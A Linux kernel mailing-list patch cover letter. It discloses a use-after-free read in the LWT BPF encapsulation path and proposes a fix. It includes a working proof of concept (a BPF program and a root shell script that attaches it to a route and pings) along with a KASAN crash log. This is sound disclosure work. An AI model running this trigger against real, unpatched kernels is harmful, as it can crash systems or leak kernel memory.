Received: from mail-yx1-f41.google.com (mail-yx1-f41.google.com [74.125.224.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 75E193AD530
	for <bpf@vger.kernel.org>; Thu,  8 Oct 2026 16:59:46 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.224.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791478787; cv=none; b=cMnVVLCR0//fjXRRGWAU0ow3go5BLEHfnoAzyVbbabkk+kPnSJEnjDI495WPMspROLQFc9FHcSRCMyAKVOF6FJodXwEGw7YA9q0Z6bnxtNgJnU9tW7dK56vANxo2/g0LZrWHqZIvQ6Xt5XX0u0yNjThDF4MHoM6PnMPUDBpeusY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791478787; c=relaxed/simple;
	bh=+dR4jNcvmupEfQa/C5ZhcT9T8NIlHDANx5WK7cvCVR8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=AtuxClmsnV3pEwcLTx3hpaRAbgJvLtxsmQndA9up2wW0ai1whu3raMGX9cspk2HCCPD46fTp17EC+q33A2OoAAv+H52t6T4HxLfQrt0Uu3EwT1aWZO+dcm8aqqCEYxD918qZuN2qghDJMrBKMtll4+k9bQB9wMH98uoyW1d+SGg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=ss0cEgwR; arc=none smtp.client-ip=74.125.224.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="ss0cEgwR"
Received: by mail-yx1-f41.google.com with SMTP id 956f58d0204a3-6768a9fc0e8so5364346d50.2
        for <bpf@vger.kernel.org>; Thu, 08 Oct 2026 09:59:46 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791478785; x=1792083585; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Bd42di3tIDcCFAVz7Orjy/Hri7iCd9qUQQwFpiR0LNw=;
        b=ss0cEgwRm7VDiQQqb8LGw3MfKpRiXgDB4Jg+Es14xyUSL8ez7I/rfL4haqoWBG02TM
         20ZodKfxEMI0L+UnQwbpWl457LZSzoqPp4d9URGWcBecXlrEa20W4OCLBGunYZ9yH6rD
         vJwQeYoybOKFkUQPkiIXvPpQH4w88yr6pHuCIyLAdytdPLhYUX9/m0lDYRtPEd7BYpYn
         bureIIUtSBPxAgFxKZWH5O7qMDZqnlG4Ot5SrtlKCc1RgvBCpRRuwr4pLg+hulBBlYXJ
         NaRDBvhV6j+YEGJFvKwgyE1GNj08XrCkoWbtL3vSFc1OXI4zNysPZytqJoqOylseC8dV
         jczw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791478785; x=1792083585;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Bd42di3tIDcCFAVz7Orjy/Hri7iCd9qUQQwFpiR0LNw=;
        b=U+dmN0jxertYh4x8JOW3Zj/cRr5jb4yG1Xbpax0ew8ntAE46y7bFtMR2iPw+7z+5ZJ
         jP9FEUMMNgrNBdU6+gmqLgq3jrRRyEbpsqzje/KZ6SFxEI8xKNqgcirRHY60znRyoZ72
         kMYCobjVikjhbCMqGY2vNG6FV2KlivkBfLyTRdviYPv3yA7lvkfyaaB3B4U+VzwMppqy
         4YcrV1A/AaE9RyhBAb+MZEDjutivWkVwivHsY3cv+ienjCGrRaOBxHEK6CEN1Aa7udO3
         1sT7GvrqqvwpL3c5o4kZ08irBBI+R4cFeShXJdMIhEBlmFCpKwV93NDmTUg9uRPD0SyR
         hQow==
X-Forwarded-Encrypted: i=1; AKwUvBypk0bNtp7x10qI+KkbNuNARDYnGLYJPuNAs+4/o8agJ+RCSC8AerniWVrhSirBN835Xms=@vger.kernel.org
X-Gm-Message-State: AFq9FYK+1hrwpozgFOmgjDqeXGkO5masdBtKXl43CbnDYEIYBPzEfHEQ
	JSXTwGzUp8tCeJH8R+caZ8yKXJl+uxrA4bHFuq/WuJsoDuejqFs6ZRFrDBNsX/tCDNLI
X-Gm-Gg: AYBFou213eB9t3K+CfqqO3bqe3v4E0rJ1GEt+FpSvOdDdX2ss1pxJNigQAQblgPpwuW
	4QZujq8r+Cg9eBJYU28g/t9umWGoZ+BSz6FGnYpV+1QDWW9dcxRFi3V1jJlatCTNOIjyVg+grsh
	H7cRa8st7QlqvHc4m6sZH1tuXEwfjDnPl11yvBSD04MvMtUkDE05RH3MUzI+K7Ax/nlOC4Kw8dJ
	FQDH9JgFIf2IPWX37lV8rTMzhVDD7aJMwAch23LSZBCosPKol6kdYT8zwk1gb31cWFFU5Y2ejHK
	gtGDfL5JtzDO1TfbkDS0d+Za/tm76mJTdqVf6k3hJsSRoQIvRWD92pMi5vJiUZ2ya2q8UI7wGP3
	BdXycm4D3cdNXwV1LXPlLG+kjjgMVgqSK7hrKGxpKooesrZM9czu/pV6szlT7f6L9JNj2zDodsF
	LexzirXRPEqWwXdKymATAe5DIbt6+St+LpuEvLAsrXxFE1rlyBBVe8Bfg9nco04nVyQuSFss0ZH
	bZLHGGC
X-Received: by 2002:a05:690e:dc6:b0:677:df02:fbe with SMTP id 956f58d0204a3-6790a404061mr2704628d50.27.1791478785094;
        Thu, 08 Oct 2026 09:59:45 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([191.222.220.30])
        by smtp.gmail.com with ESMTPSA id 956f58d0204a3-6791b26486asm1537965d50.24.2026.10.08.09.59.38
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 08 Oct 2026 09:59:44 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	daniel@iogearbox.net,
	martin.lau@kernel.org,
	zirajs7@gmail.com,
	fmancera@suse.de,
	leon.hwang@linux.dev,
	luoxuanqiang@kylinos.cn,
	posk@google.com,
	ast@kernel.org,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net: lwt_bpf: preserve encap header across skb head realloc
Date: Fri,  9 Oct 2026 00:59:34 +0800
Message-ID: <cover.1791433504.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated a use-after-free issue in net/core/lwt_bpf.c.
The bug can be triggered by an LWT BPF program requesting more headroom
than the skb currently has, leading to a slab-use-after-free read.
We have tested it, and it should not affect any other functionality.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11304

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

=== details below ===

Bug details:

The BPF verifier permits an skb-backed bpf_dynptr_slice() pointer to
satisfy the helper's ARG_PTR_TO_MEM | MEM_RDONLY header argument.

In bpf_lwt_push_ip_encap(), skb_cow_head() is called to expand headroom.
If the skb headroom is insufficient or the skb is cloned,
skb_cow_head() invokes pskb_expand_head(), which allocates a new head
buffer and frees the old one. If the encapsulation header pointer hdr
points into the skb head, it becomes stale after reallocation.
Subsequent reads of iph and hdr in skb_postpush_rcsum(), UDP tunnel
header handling, and memcpy() lead to a use-after-free read.

Fix this by copying the encapsulation header into a local buffer if
hdr points into the skb head, preserving it across skb_cow_head().

Reproducer:

The reproducer attaches an LWT_XMIT BPF program to an IPv4 route via
"encap bpf xmit". The BPF program obtains an skb-backed dynptr slice
and calls bpf_lwt_push_encap(skb, BPF_LWT_ENCAP_IP, hdr, 256).
A subsequent packet transmission triggers skb_cow_head() reallocation.

We run the PoC in an x86 QEMU environment.

=== BEGIN poc.bpf.c ===
    // SPDX-License-Identifier: GPL-2.0
    #include <linux/bpf.h>
    #include <linux/ip.h>

    #define HDR_LEN 256

    #define SEC(name) __attribute__((section(name), used))
    #define __ksym __attribute__((section(".ksyms")))
    #define __weak __attribute__((weak))

    extern int bpf_dynptr_from_skb(struct __sk_buff *skb, __u64 flags,
    			       struct bpf_dynptr *ptr__uninit) __ksym __weak;
    extern void *bpf_dynptr_slice(const struct bpf_dynptr *ptr,
				  __u32 offset, void *buffer,
				  __u32 buffer__szk) __ksym __weak;

    static long (*bpf_lwt_push_encap)(struct __sk_buff *skb, __u32 type,
    				  void *hdr, __u32 len) =
    	(void *)BPF_FUNC_lwt_push_encap;

    SEC("lwt_xmit")
    int trigger(struct __sk_buff *skb)
    {
    	struct bpf_dynptr ptr;
    	void *hdr;

    	if (bpf_dynptr_from_skb(skb, 0, &ptr))
    		return BPF_OK;

    	if (skb->len < HDR_LEN)
    		return BPF_OK;

    	hdr = bpf_dynptr_slice(&ptr, 0, NULL, HDR_LEN);
    	if (!hdr)
    		return BPF_OK;

    	bpf_lwt_push_encap(skb, BPF_LWT_ENCAP_IP, hdr, HDR_LEN);
    	return BPF_OK;
    }

    char _license[] SEC("license") = "GPL";
=== END poc.bpf.c ===

=== BEGIN poc.sh ===
    #!/bin/sh
    set -eu

    DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
    ROUTE_CIDR=${ROUTE_CIDR:-10.0.0.0/24}
    SRC_IP=${SRC_IP:-10.0.0.1}
    DST_IP=${DST_IP:-10.0.0.2}
    PING_SIZE=${PING_SIZE:-400}
    PING_COUNT=${PING_COUNT:-10}
    DEV=${DEV:-dummy0}

    cleanup() {
    	ip route del "$ROUTE_CIDR" 2>/dev/null || true
    	ip link del "$DEV" 2>/dev/null || true
    	ip addr del "$SRC_IP/32" dev lo 2>/dev/null || true
    }

    trap cleanup EXIT

    echo 0 > /proc/sys/kernel/panic_on_warn

    ip route del "$ROUTE_CIDR" 2>/dev/null || true
    ip link del "$DEV" 2>/dev/null || true
    ip addr del "$SRC_IP/32" dev lo 2>/dev/null || true

    ip link add "$DEV" type dummy
    ip link set lo up
    ip addr add "$SRC_IP/32" dev lo
    ip link set "$DEV" up
    ip route add "$ROUTE_CIDR" dev "$DEV" \
        encap bpf xmit obj "$DIR/poc.bpf.o" sec lwt_xmit

    i=1
    while [ "$i" -le "$PING_COUNT" ]; do
    	ping -c 1 -W 1 -s "$PING_SIZE" -I "$SRC_IP" "$DST_IP" \
    		>/dev/null 2>&1 || true
    	i=$((i + 1))
    done
=== END poc.sh ===

=== BEGIN crash log ===
    [  638.779599] [  T10729] BUG: KASAN: slab-use-after-free in bpf_lwt_push_ip_encap+0x805/0x1ac0
    [  638.779680] [  T10729] Read of size 256 at addr ffff88810c74e410 by task ping/10729
    [  638.779715] [  T10729] CPU: 3 UID: 0 PID: 10729 Comm: ping Not tainted 6.12.95 #2
    [  638.779727] [  T10729] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
    [  638.779749] [  T10729] Call Trace:
    [  638.779761] [  T10729]  <TASK>
    [  638.779765] [  T10729]  dump_stack_lvl+0x78/0xe0
    [  638.779831] [  T10729]  print_report+0xc6/0x620
    [  638.779888] [  T10729]  ? bpf_lwt_push_ip_encap+0x805/0x1ac0
    [  638.779893] [  T10729]  ? srso_alias_return_thunk+0x5/0xfbef5
    [  638.779923] [  T10729]  ? __virt_addr_valid+0x1f3/0x3d0
    [  638.779976] [  T10729]  ? bpf_lwt_push_ip_encap+0x805/0x1ac0
    [  638.779981] [  T10729]  kasan_report+0xd8/0x110
    [  638.779989] [  T10729]  ? bpf_lwt_push_ip_encap+0x805/0x1ac0
    [  638.780000] [  T10729]  kasan_check_range+0xf4/0x1a0
    [  638.780015] [  T10729]  __asan_memcpy+0x23/0x60
    [  638.780021] [  T10729]  bpf_lwt_push_ip_encap+0x805/0x1ac0
    [  638.780027] [  T10729]  ? srso_alias_return_thunk+0x5/0xfbef5
    [  638.780034] [  T10729]  bpf_lwt_xmit_push_encap+0x2b/0x40
    [  638.780053] [  T10729]  bpf_prog_62cb242b810c4a7f_trigger+0x6b/0x74
    [  638.780067] [  T10729]  run_lwt_bpf.isra.0+0x32f/0x8c0
    [  638.780148] [  T10729]  ? lwtunnel_xmit+0x102/0x4e0
    [  638.780157] [  T10729]  bpf_xmit+0x139/0x380
    [  638.780164] [  T10729]  lwtunnel_xmit+0x1f7/0x4e0
    [  638.780169] [  T10729]  ip_finish_output2+0x8be/0x1eb0
    [  638.780233] [  T10729]  ip_output+0x171/0x3b0
    [  638.780240] [  T10729]  ip_push_pending_frames+0x1e6/0x250
    [  638.780246] [  T10729]  ping_v4_sendmsg+0x719/0x16e0
    [  638.780343] [  T10729]  __sys_sendto+0x32e/0x3a0
    [  638.780395] [  T10729]  __x64_sys_sendto+0xe0/0x1c0
    [  638.780448] [  T10729]  do_syscall_64+0xc7/0x270
    [  638.780455] [  T10729]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
    [  638.780534] [  T10729]  </TASK>
=== END crash log ===

Best regards,
Luxiao Xu

Luxiao Xu (1):
  net: lwt_bpf: preserve encap header across skb head realloc

 net/core/lwt_bpf.c | 6 ++++++
 1 file changed, 6 insertions(+)

-- 
2.43.0
